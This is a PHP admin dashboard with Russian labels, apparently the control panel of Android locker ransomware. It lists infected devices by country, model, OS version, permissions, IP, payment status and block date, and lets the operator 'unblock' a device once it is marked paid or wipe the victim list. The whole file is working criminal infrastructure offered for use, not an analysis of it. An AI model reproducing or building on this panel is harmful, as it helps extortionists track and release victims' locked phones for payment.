<?php
    session_start ();
    require_once realpath(dirname(__FILE__)) . '/../utils/db.php';
	
    if (!isset ($_SESSION ['authorized'])) {
		header ("Location: login.php");
		exit();
	}
    
	if(isset($_GET["action"])) {
	
		switch ($_GET['action']) {
			case "clear":
				query("DELETE FROM `clients`", null);
				break;
			case "unblock":
				query("UPDATE `clients` SET `payed`=1 WHERE `uid`=?", array($_GET["uid"]));
				break;
			default:
				break;
		}
		
		header ("Location: index.php");
	
	}
	
	
?>

<html>
    <head>
        <link rel="stylesheet" href="./css/style.css">
    </head>

    <body>
		<img src="./img/logo.png" width="70">
		<div align="center">
			<button onclick="window.location = 'index.php?action=clear'">Очистить</button>
			<button onclick="window.location = 'logout.php'">Выйти</button>
			<table border="1">
				<tr>
					<th>UID</th>
					<th>Страна</th>
					<th>Устройство</th>
					<th>Версия Android</th>
					<th>Права</th>
					<th>Оплата</th>
					<th>IP</th>
					<th>Дата блокировки</th>
					<th></th>
				</tr>
				<br>
			<?php
				$clients = get_clients();
				
				echo '<h2>Всего: ' . count ($clients) . '</h2>';
				foreach ($clients as $client) {
					echo "<tr>";
					echo "<td>" . $client["uid"] . "</td>";
					echo '<td><img src="./img/flags/' . $client['country'] . '.png"></td>';
					echo "<td>" . $client["model"] . "</td>";
					echo "<td>" . $client["os"] . "</td>";
					echo "<td>" . $client["permissions"] . "</td>";
					echo "<td>" . $client["payed"] . "</td>";
					echo "<td>" . $client["ip"] . "</td>";
					echo "<td>" . $client["date"] . "</td>";
					echo "<td><button onclick=\"window.location = 'index.php?action=unblock&uid=" . $client["uid"] . "'\">Unblock</button>";
				}
					
			?>

			</table>
		</div>
    </body>
</html>
